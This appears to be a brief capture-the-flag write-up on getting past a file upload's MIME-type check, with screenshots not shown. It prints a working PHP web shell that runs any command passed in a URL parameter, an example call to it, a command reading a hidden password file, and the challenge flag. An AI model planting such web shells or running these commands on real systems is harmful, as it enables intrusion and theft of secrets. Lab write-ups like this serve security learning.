



What is MIME type ?




![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307203429.png)


I can then to do this :

```
\\Example
image?c=id
```

The Payload :

```
<?php
if(isset($_GET['c'])) {
    echo "<pre>"; 
    system($_GET['c']);
    echo "</pre>";
}
?>
```





![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307203734.png)




```
cat ../../../.passwd
```

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307203353.png)





Flag : a7n4nizpgQgnPERy89uanf6T4